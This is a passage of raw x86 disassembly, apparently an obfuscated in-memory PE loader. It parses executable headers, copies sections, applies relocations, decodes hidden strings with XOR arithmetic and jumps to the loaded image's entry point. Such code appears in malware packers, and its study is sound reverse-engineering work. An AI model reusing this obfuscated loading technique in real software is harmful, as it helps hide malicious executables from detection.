  426c2b:	xor    eax,esi
  426c2d:	add    eax,edi
  426c2f:	imul   eax,ecx
  426c32:	mov    ecx,DWORD PTR [ebp-0x1c]
  426c35:	mov    DWORD PTR [ecx+ebx*4],eax
  426c38:	mov    eax,DWORD PTR [ebp-0x8]
  426c3b:	xor    eax,esi
  426c3d:	lea    ebx,[ebx+eax*1+0x3272ef]
  426c44:	mov    eax,DWORD PTR [ebp-0x4]
  426c47:	mov    ecx,DWORD PTR [ebp-0x1c]
  426c4a:	xor    eax,esi
  426c4c:	add    eax,edi
  426c4e:	cmp    DWORD PTR [ecx+ebx*4],eax
  426c51:	jne    0x426b82
  426c57:	mov    edx,DWORD PTR [ebp-0x10]
  426c5a:	mov    ecx,DWORD PTR [ebp-0x2c]
  426c5d:	mov    eax,DWORD PTR [ebp-0x18]
  426c60:	sub    edx,0x3272ee
  426c66:	xor    edx,esi
  426c68:	jmp    0x426a32
  426c6d:	mov    ecx,DWORD PTR [ebp-0x4]
  426c70:	xor    ecx,esi
  426c72:	add    ecx,edi
  426c74:	cmp    eax,ecx
  426c76:	mov    eax,DWORD PTR [ebp-0x4]
  426c79:	jne    0x426c83
  426c7b:	mov    eax,DWORD PTR [ebp-0x8]
  426c7e:	jmp    0x426c83
  426c80:	mov    eax,DWORD PTR [ebp-0x4]
  426c83:	xor    eax,esi
  426c85:	add    eax,edi
  426c87:	pop    edi
  426c88:	pop    esi
  426c89:	pop    ebx
  426c8a:	leave  
  426c8b:	ret    0xc
  426c8e:	push   ebp
  426c8f:	mov    ebp,esp
  426c91:	sub    esp,0x28
  426c94:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426c9b:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  426ca2:	mov    eax,DWORD PTR [ebp+0xc]
  426ca5:	mov    DWORD PTR [ebp+0xc],eax
  426ca8:	push   esi
  426ca9:	mov    eax,eax
  426cab:	mov    eax,DWORD PTR [ebp-0x4]
  426cae:	mov    esi,DWORD PTR [ebp+0x8]
  426cb1:	mov    ecx,0x75108a8
  426cb6:	xor    eax,ecx
  426cb8:	mov    edx,0x3272ef
  426cbd:	add    eax,edx
  426cbf:	cmp    esi,eax
  426cc1:	je     0x426de8
  426cc7:	mov    eax,DWORD PTR [ebp+0x8]
  426cca:	mov    esi,DWORD PTR [ebp+0x8]
  426ccd:	add    esi,DWORD PTR [eax+0x3c]
  426cd0:	push   edi
  426cd1:	mov    DWORD PTR [ebp+0xc],esi
  426cd4:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  426cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  426cde:	mov    esi,DWORD PTR [ebp-0x4]
  426ce1:	mov    edi,DWORD PTR [ebp+0xc]
  426ce4:	xor    esi,ecx
  426ce6:	xor    eax,ecx
  426ce8:	add    esi,edx
  426cea:	cmp    DWORD PTR [edi+eax*8+0x19397f0],esi
  426cf1:	je     0x426de2
  426cf7:	mov    esi,DWORD PTR [ebp+0xc]
  426cfa:	mov    eax,DWORD PTR [ebp+0x8]
  426cfd:	add    eax,DWORD PTR [esi+0xa0]
  426d03:	mov    esi,DWORD PTR [ebp+0x8]
  426d06:	mov    edi,DWORD PTR [ebp+0xc]
  426d09:	sub    esi,DWORD PTR [edi+0x34]
  426d0c:	mov    edi,DWORD PTR [ebp-0x4]
  426d0f:	xor    edi,ecx
  426d11:	add    edi,edx
  426d13:	mov    DWORD PTR [ebp-0x24],esi
  426d16:	cmp    esi,edi
  426d18:	je     0x426de2
  426d1e:	mov    esi,DWORD PTR [ebp-0x4]
  426d21:	xor    esi,ecx
  426d23:	add    esi,edx
  426d25:	mov    DWORD PTR [ebp-0x8],esi
  426d28:	push   ebx
  426d29:	mov    DWORD PTR [ebp-0x10],0xf89c85bc
  426d30:	jmp    0x426dcc
  426d35:	mov    esi,DWORD PTR [ebp-0x4]
  426d38:	xor    esi,ecx
  426d3a:	lea    edi,[ebx-0x8]
  426d3d:	add    esi,edx
  426d3f:	shr    edi,1
  426d41:	cmp    esi,edi
  426d43:	jae    0x426db2
  426d45:	sub    edi,esi
  426d47:	lea    ebx,[eax+esi*2+0x8]
  426d4b:	mov    DWORD PTR [ebp-0x18],edi
  426d4e:	movzx  esi,WORD PTR [ebx]
  426d51:	and    esi,0xfff
  426d57:	mov    DWORD PTR [ebp-0x14],esi
  426d5a:	mov    edi,DWORD PTR [ebp-0x14]
  426d5d:	mov    esi,DWORD PTR [eax]
  426d5f:	sub    esi,edx
  426d61:	add    edi,esi
  426d63:	movzx  esi,WORD PTR [ebx]
  426d66:	shr    esi,0xc
  426d69:	xor    edi,ecx
  426d6b:	mov    DWORD PTR [ebp-0x20],edi
  426d6e:	mov    DWORD PTR [ebp-0x14],esi
  426d71:	mov    esi,DWORD PTR [ebp-0x20]
  426d74:	mov    edi,DWORD PTR [ebp+0x8]
  426d77:	xor    esi,ecx
  426d79:	lea    esi,[esi+edi*1+0x3272ef]
  426d80:	mov    DWORD PTR [ebp-0x20],esi
  426d83:	mov    esi,DWORD PTR [ebp-0x10]
  426d86:	mov    edi,DWORD PTR [ebp-0x14]
  426d89:	xor    esi,ecx
  426d8b:	add    esi,edx
  426d8d:	cmp    edi,esi
  426d8f:	jne    0x426da7
  426d91:	mov    esi,DWORD PTR [ebp-0x10]
  426d94:	mov    edi,DWORD PTR [ebp-0x14]
  426d97:	xor    esi,ecx
  426d99:	add    esi,edx
  426d9b:	cmp    edi,esi
  426d9d:	jne    0x426da7
  426d9f:	mov    esi,DWORD PTR [ebp-0x20]
  426da2:	mov    edi,DWORD PTR [ebp-0x24]
  426da5:	add    DWORD PTR [esi],edi
  426da7:	add    ebx,0x2
  426daa:	dec    DWORD PTR [ebp-0x18]
  426dad:	jne    0x426d4e
  426daf:	mov    ebx,DWORD PTR [ebp-0xc]
  426db2:	add    DWORD PTR [ebp-0x8],ebx
  426db5:	mov    esi,DWORD PTR [ebp-0x1c]
  426db8:	mov    edi,DWORD PTR [ebp-0x8]
  426dbb:	mov    ebx,DWORD PTR [ebp+0xc]
  426dbe:	xor    esi,ecx
  426dc0:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397f4]
  426dc7:	jae    0x426de1
  426dc9:	add    eax,DWORD PTR [ebp-0xc]
  426dcc:	mov    esi,DWORD PTR [ebp-0x4]
  426dcf:	mov    ebx,DWORD PTR [eax+0x4]
  426dd2:	xor    esi,ecx
  426dd4:	add    esi,edx
  426dd6:	mov    DWORD PTR [ebp-0xc],ebx
  426dd9:	cmp    ebx,esi
  426ddb:	jne    0x426d35
  426de1:	pop    ebx
  426de2:	mov    eax,DWORD PTR [ebp-0x28]
  426de5:	pop    edi
  426de6:	jmp    0x426deb
  426de8:	mov    eax,DWORD PTR [ebp-0x4]
  426deb:	xor    eax,ecx
  426ded:	add    eax,edx
  426def:	pop    esi
  426df0:	leave  
  426df1:	ret    0x8
  426df4:	push   ebp
  426df5:	mov    ebp,esp
  426df7:	sub    esp,0xd8
  426dfd:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426e04:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  426e0b:	mov    eax,DWORD PTR [ebp-0x4]
  426e0e:	push   ebx
  426e0f:	push   esi
  426e10:	mov    esi,0x75108a8
  426e15:	xor    eax,esi
  426e17:	push   edi
  426e18:	mov    edi,0x3272ef
  426e1d:	add    eax,edi
  426e1f:	mov    DWORD PTR [ebp-0x18],eax
  426e22:	mov    eax,DWORD PTR [ebp-0x4]
  426e25:	xor    eax,esi
  426e27:	add    eax,edi
  426e29:	mov    DWORD PTR [ebp-0x8],eax
  426e2c:	mov    ebx,DWORD PTR [ebp+0x20]
  426e2f:	mov    eax,DWORD PTR [ebp-0x1c]
  426e32:	mov    ecx,DWORD PTR [ebp-0x1c]
  426e35:	xor    eax,ecx
  426e37:	mov    DWORD PTR [ebp-0x1c],eax
  426e3a:	add    DWORD PTR [ebp-0x1c],0xf89cb5b9
  426e41:	mov    eax,DWORD PTR [ebp-0xc]
  426e44:	mov    ecx,DWORD PTR [ebp-0xc]
  426e47:	xor    eax,ecx
  426e49:	mov    DWORD PTR [ebp-0xc],eax
  426e4c:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	mov    ecx,DWORD PTR [ebp-0x10]
  426e59:	xor    eax,ecx
  426e5b:	mov    DWORD PTR [ebp-0x10],eax
  426e5e:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  426e65:	mov    eax,DWORD PTR [ebp-0x28]
  426e68:	mov    ecx,DWORD PTR [ebp-0x28]
  426e6b:	xor    eax,ecx
  426e6d:	mov    DWORD PTR [ebp-0x28],eax
  426e70:	add    DWORD PTR [ebp-0x28],0xf89f05b9
  426e77:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  426e7e:	mov    eax,DWORD PTR [ebp+0x8]
  426e81:	test   eax,eax
  426e83:	je     0x42730c
  426e89:	mov    eax,DWORD PTR [ebp+0xc]
  426e8c:	test   eax,eax
  426e8e:	je     0x42730c
  426e94:	mov    eax,DWORD PTR [ebp+0x18]
  426e97:	test   eax,eax
  426e99:	je     0x42730c
  426e9f:	mov    eax,DWORD PTR [ebp+0x20]
  426ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  426ea5:	xor    eax,0x8a8
  426eaa:	add    eax,0x72ef
  426eaf:	cmp    WORD PTR [ecx],ax
  426eb2:	jne    0x42730c
  426eb8:	mov    eax,DWORD PTR [ebp-0x4]
  426ebb:	xor    eax,esi
  426ebd:	add    eax,edi
  426ebf:	mov    DWORD PTR [ebp-0x30],eax
  426ec2:	mov    eax,DWORD PTR [ebp-0x4]
  426ec5:	mov    ecx,DWORD PTR [ebp+0x8]
  426ec8:	mov    eax,DWORD PTR [ebp+0x8]
  426ecb:	add    eax,DWORD PTR [ecx+0x3c]
  426ece:	mov    DWORD PTR [ebp+0xc],eax
  426ed1:	mov    eax,DWORD PTR [eax+0x50]
  426ed4:	test   eax,eax
  426ed6:	je     0x42730c
  426edc:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  426ee3:	mov    eax,DWORD PTR [ebp-0x2c]
  426ee6:	xor    eax,esi
  426ee8:	add    eax,edi
  426eea:	mov    DWORD PTR [ebp-0x2c],eax
  426eed:	mov    eax,DWORD PTR [ebp-0x4]
  426ef0:	mov    eax,DWORD PTR [ebx+0x190]
  426ef6:	mov    ecx,DWORD PTR [eax]
  426ef8:	mov    ecx,DWORD PTR [ecx+0x3c]
  426efb:	add    ecx,DWORD PTR [eax]
  426efd:	mov    eax,DWORD PTR [ebp-0x4]
  426f00:	mov    eax,DWORD PTR [ebx+0x18c]
  426f06:	mov    edx,DWORD PTR [eax]
  426f08:	mov    DWORD PTR [ebp-0x20],ecx
  426f0b:	mov    DWORD PTR [ebp+0x20],edx
  426f0e:	cmp    edx,edx
  426f10:	jne    0x426f44
  426f12:	mov    eax,DWORD PTR [ebx+0x1e0]
  426f18:	lea    edx,[ebp-0x18]
  426f1b:	push   edx
  426f1c:	mov    edx,DWORD PTR [ebp-0xc]
  426f1f:	xor    edx,esi
  426f21:	add    edx,edi
  426f23:	push   edx
  426f24:	push   DWORD PTR [ecx+0x50]
  426f27:	push   DWORD PTR [ebp+0x20]
  426f2a:	call   DWORD PTR [eax+0x1c]
  426f2d:	mov    eax,DWORD PTR [ebp-0x20]
  426f30:	mov    ecx,DWORD PTR [eax+0x54]
  426f33:	mov    eax,DWORD PTR [eax+0x50]
  426f36:	sub    eax,ecx
  426f38:	add    ecx,DWORD PTR [ebp+0x20]
  426f3b:	push   ecx
  426f3c:	call   0x4278a7
  426f41:	mov    edx,DWORD PTR [ebp+0x20]
  426f44:	mov    eax,DWORD PTR [ebx+0x194]
  426f4a:	mov    DWORD PTR [eax],edx
  426f4c:	mov    eax,DWORD PTR [ebp+0xc]
  426f4f:	push   DWORD PTR [eax+0x54]
  426f52:	push   DWORD PTR [ebp+0x8]
  426f55:	push   edx
  426f56:	call   0x42779d
  426f5b:	mov    ecx,DWORD PTR [ebp+0x20]
  426f5e:	mov    eax,DWORD PTR [ecx+0x3c]
  426f61:	add    eax,ecx
  426f63:	movzx  ecx,WORD PTR [eax+0x14]
  426f67:	lea    ecx,[ecx+eax*1+0x18]
  426f6b:	mov    DWORD PTR [ebp+0x18],ecx
  426f6e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f71:	movzx  edx,WORD PTR [eax+0x6]
  426f75:	xor    ecx,esi
  426f77:	add    ecx,edi
  426f79:	mov    DWORD PTR [ebp+0xc],eax
  426f7c:	cmp    edx,ecx
  426f7e:	je     0x42702b
  426f84:	mov    ecx,DWORD PTR [ebp-0x4]
  426f87:	xor    ecx,esi
  426f89:	add    ecx,edi
  426f8b:	mov    DWORD PTR [ebp-0x8],ecx
  426f8e:	mov    ecx,DWORD PTR [ebp-0x24]
  426f91:	movzx  edx,WORD PTR [eax+0x6]
  426f95:	xor    ecx,esi
  426f97:	sub    edx,ecx
  426f99:	sub    edx,edi
  426f9b:	cmp    DWORD PTR [ebp-0x8],edx
  426f9e:	ja     0x42702b
  426fa4:	mov    edx,DWORD PTR [ebp+0x18]
  426fa7:	add    edx,0x8
  426faa:	mov    DWORD PTR [ebp+0x18],edx
  426fad:	jmp    0x426fb2
  426faf:	mov    edx,DWORD PTR [ebp+0x18]
  426fb2:	mov    eax,DWORD PTR [eax+0x38]
  426fb5:	lea    ecx,[eax-0x1]
  426fb8:	mov    DWORD PTR [ebp-0x38],eax
  426fbb:	mov    eax,DWORD PTR [edx]
  426fbd:	test   eax,ecx
  426fbf:	je     0x426fc8
  426fc1:	not    ecx
  426fc3:	and    eax,ecx
  426fc5:	add    eax,DWORD PTR [ebp-0x38]
  426fc8:	mov    ecx,DWORD PTR [edx+0x4]
  426fcb:	add    ecx,DWORD PTR [ebp+0x20]
  426fce:	push   ecx
  426fcf:	call   0x4278a7
  426fd4:	mov    edx,DWORD PTR [ebp-0x4]
  426fd7:	mov    eax,DWORD PTR [ebp+0x18]
  426fda:	mov    ecx,DWORD PTR [eax+0x8]
  426fdd:	xor    edx,esi
  426fdf:	add    edx,edi
  426fe1:	cmp    ecx,edx
  426fe3:	je     0x426ffc
  426fe5:	push   ecx
  426fe6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fe9:	add    ecx,DWORD PTR [eax+0xc]
  426fec:	mov    eax,DWORD PTR [eax+0x4]
  426fef:	add    eax,DWORD PTR [ebp+0x20]
  426ff2:	push   ecx
  426ff3:	push   eax
  426ff4:	call   0x42779d
  426ff9:	mov    eax,DWORD PTR [ebp+0x18]
  426ffc:	mov    ecx,DWORD PTR [ebp-0x24]
  426fff:	mov    edx,DWORD PTR [ebp-0x8]
  427002:	add    eax,0x28
  427005:	xor    ecx,esi
  427007:	lea    ecx,[edx+ecx*1+0x3272ef]
  42700e:	mov    edx,DWORD PTR [ebp+0xc]
  427011:	mov    DWORD PTR [ebp+0x18],eax
  427014:	mov    eax,DWORD PTR [ebp-0x24]
  427017:	movzx  edx,WORD PTR [edx+0x6]
  42701b:	xor    eax,esi
  42701d:	sub    edx,eax
  42701f:	mov    eax,DWORD PTR [ebp+0xc]
  427022:	sub    edx,edi
  427024:	mov    DWORD PTR [ebp-0x8],ecx
  427027:	cmp    ecx,edx
  427029:	jbe    0x426faf
  42702b:	mov    edx,DWORD PTR [ebx+0x18c]
  427031:	mov    ecx,DWORD PTR [ebp+0x20]
  427034:	cmp    ecx,DWORD PTR [edx]
  427036:	jne    0x42705f
  427038:	mov    eax,DWORD PTR [ebx+0x1e0]
  42703e:	lea    edx,[ebp-0x18]
  427041:	push   edx
  427042:	mov    edx,DWORD PTR [ebp-0x10]
  427045:	xor    edx,esi
  427047:	add    edx,edi
  427049:	push   edx
  42704a:	mov    edx,DWORD PTR [ebp-0x20]
  42704d:	push   DWORD PTR [edx+0x54]
  427050:	push   ecx
  427051:	call   DWORD PTR [eax+0x1c]
  427054:	test   eax,eax
  427056:	je     0x4272fd
  42705c:	mov    eax,DWORD PTR [ebp+0xc]
  42705f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427065:	mov    ecx,DWORD PTR [ecx]
  427067:	xor    ecx,esi
  427069:	add    ecx,edi
  42706b:	je     0x427228
  427071:	mov    eax,DWORD PTR [ebp-0x4]
  427074:	xor    eax,esi
  427076:	add    eax,edi
  427078:	and    DWORD PTR [ebp+0x8],0x0
  42707c:	mov    DWORD PTR [ebp-0x14],eax
  42707f:	mov    eax,0xf89c85dd
  427084:	lea    ecx,[eax-0x8]
  427087:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  42708e:	mov    DWORD PTR [ebp-0x54],0xf89c852d
  427095:	mov    DWORD PTR [ebp-0x50],eax
  427098:	mov    DWORD PTR [ebp-0x4c],ecx
  42709b:	mov    DWORD PTR [ebp-0x48],ecx
  42709e:	mov    DWORD PTR [ebp-0x44],0xf89c85b9
  4270a5:	mov    edx,DWORD PTR [ebp+0x8]
  4270a8:	mov    ecx,0x8a8
  4270ad:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4270b2:	mov    edx,0x72ef
  4270b7:	add    cx,dx
  4270ba:	mov    edx,DWORD PTR [ebp+0x8]
  4270bd:	inc    DWORD PTR [ebp+0x8]
  4270c0:	cmp    DWORD PTR [ebp+0x8],0x6
  4270c4:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4270cc:	jb     0x4270a5
  4270ce:	mov    ecx,0xf89c852b
  4270d3:	mov    DWORD PTR [ebp-0xb0],eax
  4270d9:	mov    DWORD PTR [ebp-0x9c],eax
  4270df:	mov    DWORD PTR [ebp-0x74],eax
  4270e2:	mov    DWORD PTR [ebp-0x70],eax
  4270e5:	lea    eax,[ecx+0x1]
  4270e8:	mov    edx,0xf89c85ff
  4270ed:	mov    DWORD PTR [ebp-0x64],eax
  4270f0:	mov    DWORD PTR [ebp-0x60],eax
  4270f3:	mov    DWORD PTR [ebp-0xb4],0xf89c85f5
  4270fd:	mov    DWORD PTR [ebp-0xac],ecx
  427103:	mov    DWORD PTR [ebp-0xa8],edx
  427109:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427113:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  42711d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427127:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427131:	mov    DWORD PTR [ebp-0x90],0xf89c852d
  42713b:	mov    DWORD PTR [ebp-0x8c],ecx
  427141:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  42714b:	mov    DWORD PTR [ebp-0x84],edx
  427151:	mov    DWORD PTR [ebp-0x80],0xf89c8528
  427158:	mov    DWORD PTR [ebp-0x7c],ecx
  42715b:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  427162:	mov    DWORD PTR [ebp-0x6c],ecx
  427165:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  42716c:	mov    DWORD PTR [ebp-0x5c],0xf89c85b9
  427173:	xor    eax,eax
  427175:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  42717c:	xor    cl,0xa8
  42717f:	sub    cl,0x11
  427182:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427189:	inc    eax
  42718a:	cmp    eax,0x17
  42718d:	jb     0x427175
  42718f:	mov    eax,DWORD PTR [ebx+0x1e0]
  427195:	lea    ecx,[ebp-0xc0]
  42719b:	push   ecx
  42719c:	call   DWORD PTR [eax+0x4]
  42719f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4271a5:	lea    edx,[ebp-0xd8]
  4271ab:	push   edx
  4271ac:	push   eax
  4271ad:	call   DWORD PTR [ecx+0x8]
  4271b0:	mov    DWORD PTR [ebp-0x40],eax
  4271b3:	lea    eax,[ebp-0x14]
  4271b6:	push   eax
  4271b7:	mov    eax,DWORD PTR [ebx+0x18c]
  4271bd:	push   DWORD PTR [eax]
  4271bf:	mov    eax,DWORD PTR [ebp-0x40]
  4271c2:	call   eax
  4271c4:	mov    eax,DWORD PTR [ebp-0x4]
  4271c7:	xor    eax,esi
  4271c9:	add    eax,edi
  4271cb:	mov    DWORD PTR [ebp-0x34],eax
  4271ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4271d1:	mov    eax,DWORD PTR [ebp-0x14]
  4271d4:	xor    ecx,esi
  4271d6:	add    ecx,edi
  4271d8:	cmp    eax,ecx
  4271da:	je     0x427225
  4271dc:	mov    DWORD PTR [ebp-0x3c],eax
  4271df:	jmp    0x4271f0
  4271e1:	mov    eax,DWORD PTR [eax]
  4271e3:	mov    ecx,DWORD PTR [ebp-0x3c]
  4271e6:	mov    DWORD PTR [ebp-0x14],eax
  4271e9:	mov    eax,DWORD PTR [ebp-0x14]
  4271ec:	cmp    eax,ecx
  4271ee:	je     0x4271fd
  4271f0:	mov    edx,DWORD PTR [eax+0x18]
  4271f3:	mov    ecx,DWORD PTR [ebx+0x18c]
  4271f9:	cmp    edx,DWORD PTR [ecx]
  4271fb:	jne    0x4271e1
  4271fd:	mov    ecx,DWORD PTR [ebx+0x18c]
  427203:	mov    edx,DWORD PTR [eax+0x18]
  427206:	cmp    edx,DWORD PTR [ecx]
  427208:	jne    0x427225
  42720a:	mov    ecx,DWORD PTR [ebx+0x190]
  427210:	mov    edx,DWORD PTR [ebp-0x20]
  427213:	mov    edx,DWORD PTR [edx+0x28]
  427216:	add    edx,DWORD PTR [ecx]
  427218:	mov    DWORD PTR [eax+0x1c],edx
  42721b:	mov    eax,DWORD PTR [ebp-0x24]
  42721e:	xor    eax,esi
  427220:	add    eax,edi
  427222:	mov    DWORD PTR [ebp-0x34],eax
  427225:	mov    eax,DWORD PTR [ebp+0xc]
  427228:	push   ebx
  427229:	push   eax
  42722a:	push   DWORD PTR [ebp+0x20]
  42722d:	call   0x4269ab
  427232:	test   eax,eax
  427234:	je     0x4272fd
  42723a:	push   DWORD PTR [ebp+0xc]
  42723d:	mov    ecx,ebx
  42723f:	push   DWORD PTR [ebp+0x20]
  427242:	call   0x426904
  427247:	test   eax,eax
  427249:	je     0x4272fd
  42724f:	mov    eax,DWORD PTR [ebp+0xc]
  427252:	mov    edx,DWORD PTR [ebp+0x20]
  427255:	mov    ecx,ebx
  427257:	call   0x4267dd
  42725c:	test   eax,eax
  42725e:	je     0x4272fd
  427264:	push   ebx
  427265:	push   DWORD PTR [ebp+0x20]
  427268:	call   0x426c8e
  42726d:	test   eax,eax
  42726f:	je     0x4272fd
  427275:	mov    eax,DWORD PTR [ebx+0x18c]
  42727b:	mov    edx,DWORD PTR [ebp+0x20]
  42727e:	cmp    edx,DWORD PTR [eax]
  427280:	jne    0x42729c
  427282:	mov    eax,DWORD PTR [ebx+0x1e0]
  427288:	lea    ecx,[ebp-0x18]
  42728b:	push   ecx
  42728c:	push   DWORD PTR [ebp-0x18]
  42728f:	mov    ecx,DWORD PTR [ebp-0x20]
  427292:	push   DWORD PTR [ecx+0x54]
  427295:	push   edx
  427296:	call   DWORD PTR [eax+0x1c]
  427299:	mov    edx,DWORD PTR [ebp+0x20]
  42729c:	mov    eax,DWORD PTR [ebx+0x1c8]
  4272a2:	mov    eax,DWORD PTR [eax]
  4272a4:	xor    eax,esi
  4272a6:	add    eax,edi
  4272a8:	je     0x4272e1
  4272aa:	mov    ecx,DWORD PTR [ebp+0xc]
  4272ad:	mov    eax,DWORD PTR [ecx+0x28]
  4272b0:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  4272b7:	mov    esi,DWORD PTR [ebp+0x8]
  4272ba:	push   DWORD PTR [ebp+0x14]
  4272bd:	xor    esi,0x8a8
  4272c3:	push   DWORD PTR [ebp+0x10]
  4272c6:	add    esi,0x72ef
  4272cc:	or     WORD PTR [ecx+0x16],si
  4272d0:	add    eax,edx
  4272d2:	push   edx
  4272d3:	call   eax
  4272d5:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  4272df:	jmp    0x4272eb
  4272e1:	mov    eax,DWORD PTR [ebp+0xc]
  4272e4:	mov    eax,DWORD PTR [eax+0x28]
  4272e7:	add    eax,edx
  4272e9:	call   eax
  4272eb:	mov    DWORD PTR [ebp-0x8],eax
  4272ee:	mov    eax,DWORD PTR [ebp-0x8]
  4272f1:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272f4:	mov    DWORD PTR [ecx],eax
  4272f6:	mov    DWORD PTR [ebp-0x30],0x1
  4272fd:	cmp    DWORD PTR [ebp-0x30],0x0
  427301:	jne    0x427307
  427303:	and    DWORD PTR [ebp+0x20],0x0
  427307:	mov    eax,DWORD PTR [ebp+0x20]
  42730a:	jmp    0x42730e
  42730c:	xor    eax,eax
  42730e:	pop    edi
  42730f:	pop    esi
  427310:	pop    ebx
  427311:	leave  
  427312:	ret    0x1c
  427315:	push   ebp
  427316:	mov    ebp,esp
  427318:	movzx  edx,WORD PTR [ecx+0x6]
  42731c:	movzx  eax,WORD PTR [ecx+0x14]
  427320:	push   ebx
  427321:	push   edi
  427322:	xor    edi,edi
  427324:	lea    eax,[eax+ecx*1+0x18]
  427328:	test   edx,edx
  42732a:	je     0x42734b
  42732c:	mov    ecx,DWORD PTR [eax+0xc]
  42732f:	lea    ebx,[ecx+esi*1]
  427332:	cmp    DWORD PTR [ebp+0x8],ebx
  427335:	jb     0x427343
  427337:	mov    ebx,DWORD PTR [eax+0x8]
  42733a:	add    ebx,ecx
  42733c:	add    ebx,esi
  42733e:	cmp    DWORD PTR [ebp+0x8],ebx
  427341:	jb     0x42734d
  427343:	add    eax,0x28
  427346:	inc    edi
  427347:	cmp    edi,edx
  427349:	jb     0x42732c
  42734b:	xor    eax,eax
  42734d:	pop    edi
  42734e:	pop    ebx
  42734f:	pop    ebp
  427350:	ret    0x4
  427353:	push   ebp
  427354:	mov    ebp,esp
  427356:	sub    esp,0x34
  427359:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  427360:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427367:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  42736e:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  427375:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  42737c:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  427383:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  42738a:	mov    DWORD PTR [ebp-0x10],eax
  42738d:	mov    eax,DWORD PTR [ebp+0x8]
  427390:	mov    DWORD PTR [ebp-0x14],eax
  427393:	mov    eax,DWORD PTR [ebp-0xc]
  427396:	push   ebx
  427397:	mov    ecx,0x75108a8
  42739c:	xor    eax,ecx
  42739e:	push   esi
  42739f:	mov    esi,DWORD PTR [ebp-0x10]
  4273a2:	mov    edx,0x3272ef
  4273a7:	add    eax,edx
  4273a9:	push   edi
  4273aa:	cmp    esi,eax
  4273ac:	je     0x42758b
  4273b2:	mov    eax,DWORD PTR [ebp-0xc]
  4273b5:	mov    esi,DWORD PTR [ebp-0x14]
  4273b8:	xor    eax,ecx
  4273ba:	add    eax,edx
  4273bc:	cmp    esi,eax
  4273be:	je     0x42758b
  4273c4:	mov    eax,DWORD PTR [ebp-0xc]
  4273c7:	xor    eax,ecx
  4273c9:	add    eax,edx
  4273cb:	mov    DWORD PTR [ebp-0x24],eax
  4273ce:	mov    eax,DWORD PTR [ebp-0xc]
  4273d1:	xor    eax,ecx
  4273d3:	add    eax,edx
  4273d5:	mov    DWORD PTR [ebp-0x28],eax
  4273d8:	mov    edi,DWORD PTR [ebp-0x20]
  4273db:	mov    ebx,DWORD PTR [ebp-0x8]
  4273de:	mov    esi,0x8a8
  4273e3:	xor    edi,esi
  4273e5:	mov    eax,0x72ef
  4273ea:	xor    ebx,esi
  4273ec:	add    edi,eax
  4273ee:	add    ebx,eax
  4273f0:	sub    ebx,edi
  4273f2:	mov    WORD PTR [ebp-0x8],bx
  4273f6:	jmp    0x4274bb
  4273fb:	mov    edi,DWORD PTR [ebp-0xc]
  4273fe:	mov    bx,WORD PTR [ebp-0x4]
  427402:	xor    edi,esi
  427404:	add    edi,eax
  427406:	cmp    bx,di
  427409:	je     0x4274fd
  42740f:	mov    edi,DWORD PTR [ebp-0xc]
  427412:	mov    ebx,DWORD PTR [ebp+0xc]
  427415:	xor    edi,ecx
  427417:	add    edi,edx
  427419:	cmp    ebx,edi
  42741b:	mov    di,WORD PTR [ebp-0x4]
  42741f:	mov    bx,WORD PTR [ebp+0x8]
  427423:	je     0x42748e
  427425:	cmp    bx,di
  427428:	je     0x427497
  42742a:	mov    edi,DWORD PTR [ebp-0x20]
  42742d:	mov    bx,WORD PTR [ebp+0x8]
  427431:	xor    edi,esi
  427433:	add    edi,eax
  427435:	cmp    bx,di
  427438:	jb     0x427458
  42743a:	mov    edi,DWORD PTR [ebp-0x2c]
  42743d:	mov    bx,WORD PTR [ebp+0x8]
  427441:	xor    edi,esi
  427443:	add    edi,eax
  427445:	cmp    bx,di
  427448:	ja     0x427458
  42744a:	movzx  edi,WORD PTR [ebp+0x8]
  42744e:	movzx  ebx,WORD PTR [ebp-0x8]
  427452:	add    edi,ebx
  427454:	mov    WORD PTR [ebp+0x8],di
  427458:	mov    edi,DWORD PTR [ebp-0x20]
  42745b:	mov    bx,WORD PTR [ebp-0x4]
  42745f:	xor    edi,esi
  427461:	add    edi,eax
  427463:	cmp    bx,di
  427466:	jb     0x427486
  427468:	mov    edi,DWORD PTR [ebp-0x2c]
  42746b:	mov    bx,WORD PTR [ebp-0x4]
  42746f:	xor    edi,esi
  427471:	add    edi,eax
  427473:	cmp    bx,di
  427476:	ja     0x427486
  427478:	movzx  edi,WORD PTR [ebp-0x4]
  42747c:	movzx  ebx,WORD PTR [ebp-0x8]
